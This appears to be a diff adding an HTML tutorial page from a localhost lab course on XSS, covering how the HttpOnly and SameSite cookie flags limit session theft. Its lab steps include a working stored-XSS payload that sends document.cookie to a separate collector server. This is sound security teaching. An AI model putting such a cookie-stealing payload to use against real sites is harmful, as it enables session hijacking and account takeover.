@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Module 13 — Cookie & Session Hardening | xss_mastery</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600;700;900&family=Source+Code+Pro:wght@400;600&family=Lato:wght@400;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg:#0b0f1a;      --bg2:#111827;    --bg3:#1a2235;
+    --card:#141c2e;    --border:#1e3a5f; --gold:#f5c842;
+    --cyan:#38bdf8;    --teal:#0d9488;   --red:#f87171;
+    --green:#4ade80;   --purple:#a78bfa; --orange:#fb923c;
+    --text:#e2e8f0;    --muted:#7a9bbf;  --code-bg:#060d1a;
+  }
+  * { box-sizing: border-box; }
+  body { background: var(--bg); color: var(--text); font-family: 'Lato', sans-serif; line-height: 1.65; margin: 0; padding: 0 0 80px 0; }
+  .wrap { max-width: 860px; margin: 0 auto; padding: 0 28px; }
+  header.hero { background: linear-gradient(180deg, var(--bg2) 0%, var(--bg) 100%); border-bottom: 1px solid var(--border); padding: 48px 0 32px 0; }
+  h1, h2, h3 { font-family: 'Playfair Display', serif; color: var(--text); letter-spacing: 0.01em; }
+  h1 { font-size: 2.3rem; margin: 0 0 8px 0; color: var(--gold); }
+  .kicker { font-family: 'Source Code Pro', monospace; color: var(--cyan); font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.12em; }
+  .subtitle { color: var(--muted); font-size: 1.1rem; margin-top: 6px; }
+  h2 { font-size: 1.6rem; margin-top: 56px; padding-bottom: 10px; border-bottom: 2px solid var(--border); color: var(--cyan); }
+  h2 .num { display: inline-block; font-family: 'Source Code Pro', monospace; color: var(--gold); margin-right: 10px; }
+  h3 { color: var(--gold); font-size: 1.15rem; margin-top: 28px; }
+  p { margin: 14px 0; }
+  code, pre, .mono { font-family: 'Source Code Pro', monospace; }
+  pre { background: var(--code-bg); border: 1px solid var(--border); border-radius: 8px; padding: 18px 20px; overflow-x: auto; font-size: 0.87rem; line-height: 1.6; }
+  pre code { background: none; padding: 0; }
+  code { background: var(--bg3); padding: 2px 6px; border-radius: 4px; font-size: 0.88em; }
+  .cm { color: var(--muted); font-style: italic; } .kw { color: var(--purple); } .str { color: var(--green); } .fn { color: var(--cyan); }
+  .prereq-bar { display: flex; flex-wrap: wrap; gap: 8px; margin: 14px 0 22px 0; }
+  .prereq-tag { display: inline-block; background: var(--bg3); border: 1px solid var(--border); color: var(--cyan); text-decoration: none; padding: 6px 14px; border-radius: 20px; font-family: 'Source Code Pro', monospace; font-size: 0.82rem; }
+  .callout { border-left: 4px solid var(--gold); background: var(--card); padding: 18px 22px; border-radius: 6px; margin: 20px 0; }
+  .callout .label { font-family: 'Source Code Pro', monospace; text-transform: uppercase; font-size: 0.72rem; letter-spacing: 0.1em; color: var(--gold); display: block; margin-bottom: 8px; }
+  .callout.gold { border-left-color: var(--gold); } .callout.gold .label { color: var(--gold); }
+  .callout.teal { border-left-color: var(--teal); } .callout.teal .label { color: var(--teal); }
+  .callout.red { border-left-color: var(--red); } .callout.red .label { color: var(--red); }
+  .callout.green { border-left-color: var(--green); } .callout.green .label { color: var(--green); }
+  .diagram { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; margin: 18px 0; }
+  .diagram .cell { background: var(--bg3); border: 1px solid var(--border); border-radius: 8px; padding: 16px; }
+  .diagram .cell h4 { margin: 0 0 8px 0; font-family: 'Playfair Display', serif; font-size: 1.05rem; }
+  .diagram .get h4 { color: var(--red); } .diagram .post h4 { color: var(--green); }
+  .diagram .cell p { margin: 4px 0; font-size: 0.93rem; color: var(--muted); }
+  .win-box { background: var(--code-bg); border: 1px solid var(--teal); border-radius: 8px; padding: 4px 22px 18px 22px; margin: 18px 0; }
+  .win-box .title { font-family: 'Source Code Pro', monospace; color: var(--teal); font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.08em; padding-top: 14px; }
+  .win-box pre { border: none; background: none; padding: 10px 0; margin: 0; }
+  .brain { background: var(--card); border: 2px dashed var(--purple); border-radius: 8px; padding: 20px 24px; margin: 20px 0; }
+  .brain .label { font-family: 'Source Code Pro', monospace; color: var(--purple); text-transform: uppercase; font-size: 0.75rem; letter-spacing: 0.1em; }
+  .brain .answer { color: var(--muted); margin-top: 14px; padding-top: 14px; border-top: 1px solid var(--border); }
+  .qa { margin: 20px 0; } .qa .q { color: var(--gold); font-weight: 700; margin-top: 18px; } .qa .a { color: var(--text); margin-top: 6px; }
+  footer { margin-top: 70px; padding-top: 24px; border-top: 1px solid var(--border); display: flex; justify-content: space-between; font-family: 'Source Code Pro', monospace; font-size: 0.88rem; }
+  footer a { color: var(--cyan); text-decoration: none; } footer .disabled { color: var(--muted); }
+</style>
+</head>
+<body>
+
+<header class="hero">
+  <div class="wrap">
+    <div class="kicker">xss_mastery &middot; Module 13</div>
+    <h1>Cookie & Session Hardening</h1>
+    <div class="subtitle">The script still runs. This time, it finds an empty pocket.</div>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <h2><span class="num">00</span>Before You Start</h2>
+  <p><strong>Direct prerequisites for this module:</strong></p>
+  <div class="prereq-bar">
+    <a class="prereq-tag" href="../07_stored_xss_via_post/tutorial.html">Module 07 — Stored XSS via POST</a>
+  </div>
+  <div class="callout gold">
+    <span class="label">Before You Start</span>
+    You need Module 07's stored-XSS mechanic solid, and you should
+    already suspect that a script running in a victim's browser could do
+    more than change a page title — it could read anything else that
+    page has access to. This module makes that concrete: your session cookie.
+  </div>
+
+  <h2><span class="num">01</span>The Big Analogy</h2>
+  <div class="callout gold">
+    <span class="label">Head First Moment</span>
+    <p>Your session cookie is the loyalty card from Module 09 — the thing
+    that proves "this browser is currently you" to the bank. So far,
+    every attack targeted the KITCHEN. This module targets your wallet
+    directly: if a fake announcement (an injected script) can be read
+    aloud in your restaurant, it can also just as easily read the number
+    off your loyalty card out loud to a stranger standing nearby — not
+    because the stranger asked the waiter, but because the announcement
+    itself was written to do exactly that. <code>HttpOnly</code> is a
+    special kind of wallet that physically cannot be opened by anyone
+    standing at the counter, announcement or not — only the bank's own
+    back-office systems can ever see what's inside it.</p>
+  </div>
+
+  <h2><span class="num">02</span>What Actually Happened, Verified</h2>
+  <div class="diagram">
+    <div class="cell get">
+      <h4>vulnerable-cookie</h4>
+      <p><code>document.cookie</code> returned
+      <code>"session=SECRET-abc123"</code>. The injected script exfiltrated
+      it. The attacker's collector logged the real secret.</p>
+    </div>
+    <div class="cell post">
+      <h4>fixed-cookie</h4>
+      <p><code>document.cookie</code> returned <code>""</code> — empty.
+      The identical script still ran and still fired its beacon. The
+      collector logged an empty string.</p>
+    </div>
+  </div>
+
+  <p>The only code difference between the two servers is this header:</p>
+  <pre><code><span class="cm">// vulnerable-cookie:</span>
+res.setHeader(<span class="str">'Set-Cookie'</span>, <span class="str">'session=SECRET-abc123; Path=/'</span>);
+
+<span class="cm">// fixed-cookie:</span>
+res.setHeader(<span class="str">'Set-Cookie'</span>, <span class="str">'session=SECRET-abc123; Path=/; HttpOnly; SameSite=Lax'</span>);</code></pre>
+
+  <div class="callout green">
+    <span class="label">Verified</span>
+    This course actually stole a cookie and confirmed it in the attacker's
+    own server log: <code>[COLLECTOR] received cookie value:
+    "session=SECRET-abc123"</code>. Against the hardened server, the
+    identical payload, the identical attacker page, logged:
+    <code>[COLLECTOR] received cookie value: ""</code>.
+  </div>
+
+  <div class="callout red">
+    <span class="label">Why this matters</span>
+    Notice exactly what did NOT change between the two tests: the
+    stored-XSS bug. The injected <code>&lt;script&gt;</code> ran
+    successfully both times — you can confirm this because the beacon
+    request reached the collector both times. <code>HttpOnly</code>
+    doesn't stop the attack from executing. It stops the ONE PIECE of
+    that attack — reading this specific cookie via JavaScript — from
+    succeeding, categorically, at the browser level, no matter how the
+    script got there or what it's written to do.
+  </div>
+
+  <h2><span class="num">03</span>Run It on Windows 11</h2>
+  <div class="win-box">
+    <div class="title">Terminal 1 — vulnerable version</div>
+    <pre><code>cd xss_mastery\modules\13_cookie_and_session_hardening
+.\run.ps1 -Target run-vulnerable-cookie-node</code></pre>
+    <div class="title">Terminal 2 — attacker's collector</div>
+    <pre><code>.\run.ps1 -Target run-collector-node</code></pre>
+    <div class="title">Steps</div>
+    <pre><code>1. Open http://localhost:8000/ -- this sets your session cookie
+2. In DevTools console: document.cookie -- note it shows session=SECRET-abc123
+3. Post this comment via the form (or curl):
+   name: attacker
+   message: &lt;script&gt;new Image().src='http://localhost:8002/steal?c='+encodeURIComponent(document.cookie);&lt;/script&gt;
+4. Reload http://localhost:8000/ as a normal visit -- no special URL
+5. Check Terminal 2 -- it logged your real session cookie</code></pre>
+    <div class="title">Now the fixed version (stop Terminal 1, Ctrl+C)</div>
+    <pre><code>.\run.ps1 -Target run-fixed-cookie-node</code></pre>
+    <pre><code>Repeat steps 1-4 exactly. In step 2, document.cookie now returns "".
+Check Terminal 2 again -- it logs an empty string this time.</code></pre>
+    <div class="title">If you have PHP installed</div>
+    <pre><code>.\run.ps1 -Target run-vulnerable-cookie-php   /   run-fixed-cookie-php   /   run-collector-php</code></pre>
+  </div>
+
+  <h2><span class="num">04</span>Brain Exercise</h2>
+  <div class="brain">
+    <span class="label">Brain Exercise</span>
+    <p>A teammate says: "If HttpOnly stops JavaScript from reading the
+    cookie, then an XSS bug on a site using HttpOnly cookies is basically
+    harmless now, right?" What's missing from this conclusion?</p>
+    <div class="answer">
+      <strong>The injected script can still do everything else it could
+      always do — it just can't read this one specific cookie by
+      name.</strong> An XSS payload running in the victim's browser can
+      still: submit forms as the victim (CSRF-style, but from INSIDE the
+      trusted page, bypassing the origin checks Modules 09-10 relied on),
+      make authenticated requests to the same site's API using the
+      browser's automatically-attached cookies (the request still carries
+      the HttpOnly cookie — HttpOnly blocks JAVASCRIPT from reading it,
+      not the BROWSER from sending it on legitimate same-origin requests),
+      read and modify anything else on the page, log keystrokes, redirect
+      the user to a phishing page, or read any OTHER cookie that isn't
+      marked HttpOnly. Stealing the raw session token is just the single
+      most dramatic outcome — HttpOnly closes exactly that one door and
+      leaves the house's front door (the XSS bug itself) wide open. This
+      is precisely why Module 11's fix is not optional just because a
+      cookie is hardened.
+    </div>
+  </div>
+
+  <h2><span class="num">05</span>There Are No Dumb Questions</h2>
+  <div class="qa">
+    <div class="q">Q: If HttpOnly cookies still get sent on requests the malicious script makes, what's actually protected?</div>
+    <div class="a">A: What's protected is the raw secret VALUE leaving the browser in a form the attacker can read and reuse independently — for instance, pasting it into their own browser's cookie jar to impersonate the victim from a completely different machine, at a time of their choosing, even after the XSS bug is later patched. Without HttpOnly, the attacker owns a portable copy of your session. With it, any damage is limited to what the injected script can do live, in the victim's own browser, in that moment.</div>
+
+    <div class="q">Q: Does HttpOnly protect against CSRF?</div>
+    <div class="a">A: No — and this is a common mix-up. CSRF (Modules 09-10) works precisely BECAUSE the browser attaches cookies automatically to legitimate cross-site requests, regardless of HttpOnly. HttpOnly only restricts JavaScript's ability to READ a cookie's value; it has no effect on whether the browser SENDS that cookie on a request. SameSite is the flag that addresses CSRF, which is why Module 10's fix used SameSite, not HttpOnly.</div>
+
+    <div class="q">Q: Should EVERY cookie be HttpOnly?</div>
+    <div class="a">A: No — only cookies that don't need to be read by your own legitimate JavaScript. A cookie storing a non-sensitive UI preference (like "dark mode: on") that your own script legitimately needs to read has no reason to be HttpOnly. Session tokens, auth tokens, and anything whose theft would let someone impersonate the user should always be HttpOnly; that's specifically what this flag is for.</div>
+  </div>
+
+  <h2><span class="num">06</span>What's Next</h2>
+  <div class="callout teal">
+    <span class="label">What's Next</span>
+    Module 14 — <strong>Input Validation as Defense-in-Depth</strong> —
+    steps back from browser-enforced defenses (CSP, HttpOnly, SameSite)
+    to look at the role of validating input BEFORE it's ever stored or
+    rendered — explicitly as a supplement to encoding, never a
+    replacement for it. Now is the right time because you've just built a
+    strong mental map of what each browser-level defense does and doesn't
+    cover — Module 14 fills in the one layer that happens before any of them run.
+  </div>
+
+</div>
+
+<div class="wrap">
+  <footer>
+    <a href="../12_content_security_policy/tutorial.html">&larr; Module 12 — Content Security Policy</a>
+    <a href="../14_input_validation_as_defense_in_depth/tutorial.html">Module 14 — Input Validation as Defense-in-Depth &rarr;</a>
+  </footer>
+</div>
+
+</body>
+</html>
